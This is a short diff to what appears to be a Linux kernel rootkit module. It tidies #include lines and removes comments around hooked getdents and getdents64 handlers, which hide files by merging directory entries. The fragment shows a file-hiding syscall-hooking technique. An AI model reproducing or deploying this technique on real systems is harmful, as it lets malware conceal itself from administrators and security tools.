@@ -13,12 +13,9 @@
 #include <linux/dirent.h>
 #include <linux/fs.h>
 #include <linux/sched.h>
-#include <linux/fs_struct.h>
-#include <linux/stat.h>
 #include <linux/namei.h>
-#include <linux/fdtable.h>
-#include <linux/dcache.h>
 #include <linux/path.h>
+#include <linux/fs_struct.h>
 
 MODULE_LICENSE("GPL");
 #ifdef __i386__
@@ -113,7 +110,6 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
             d->d_off=(nd->d_off+d->d_off);
             d->d_reclen=(d->d_reclen+nd->d_reclen);
         }
-        //current->files->fd[fd]->f_dentry->d_inode->i_ino
         bpos += d->d_reclen; //next
     }
     copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf)); //now put it back to userspace
@@ -134,7 +130,6 @@ asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsi
             d->d_off=(nd->d_off+d->d_off);
             d->d_reclen=(d->d_reclen+nd->d_reclen);
         }
-        //current->files->fd[fd]->f_dentry->d_inode->i_ino
         bpos += d->d_reclen; //next
     }
     copy_to_user(dirp,(struct linux_dirent64 *)buf,sizeof(buf)); //now put it back to userspace
